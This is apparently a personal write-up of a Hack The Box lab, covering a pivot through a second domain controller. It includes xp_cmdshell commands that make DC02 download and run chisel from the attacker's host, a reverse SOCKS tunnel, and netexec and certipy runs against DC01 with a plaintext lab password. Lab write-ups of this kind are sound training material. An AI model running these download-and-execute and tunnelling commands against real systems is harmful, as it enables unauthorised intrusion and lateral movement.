🔍 DC02 is on an internal network `172.16.20.0/24` with DC01 at `172.16.20.1` as the gateway!

This means DC02 bridges your HTB network and the internal network. We need to pivot through DC02 to reach DC01 internally.

#powershell_DC2 
### 1. Confirm DC01 is at 172.16.20.1

```powershell
ping -n 2 172.16.20.1
```

![[Screenshot_2026-03-24_11-41-07.png]]


### 2. Kali: prepare and serve chisel

``` bash
bash# Install chisel
sudo apt install chisel -y

#Serve it
cp $(which chisel) /tmp/chisel.exe
cd /tmp
python3 -m http.server 8080
```

### 3. Kali: start chisel server (new terminal)

```bash
chisel server -p 8000 --reverse
```

### 4. DC01 MSSQL session: download chisel to DC02

```sql
EXECUTE ('EXEC xp_cmdshell ''certutil -urlcache -split -f http://10.10.14.36:8080/chisel.exe C:\Windows\Temp\chisel.exe''') AT [DC02.darkzero.ext];
```

### 5. DC01 MSSQL session: run chisel client on DC02

```sql
EXECUTE ('EXEC xp_cmdshell ''C:\Windows\Temp\chisel.exe client 10.10.14.36:8000 R:socks''') AT [DC02.darkzero.ext];
```

### 6. Kali: configure proxychains

```bash
bash# Add to /etc/proxychains4.conf (last line)
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
```

### 7. Kali: access DC01 internal interface through tunnel

```bash
proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
proxychains certipy-ad find -u 'john.w@darkzero.htb' -p 'RFulUtONCOL!' -dc-ip 172.16.20.1 -vulnerable -stdout
```

![[Screenshot_2026-03-27_11-17-18.png]]

🟢 Tunnel is working perfectly! *DC01*'s internal interface is reachable through *DC02*. Now run the full attack through the tunnel:

**Next step:** [[ADCS enumeration]]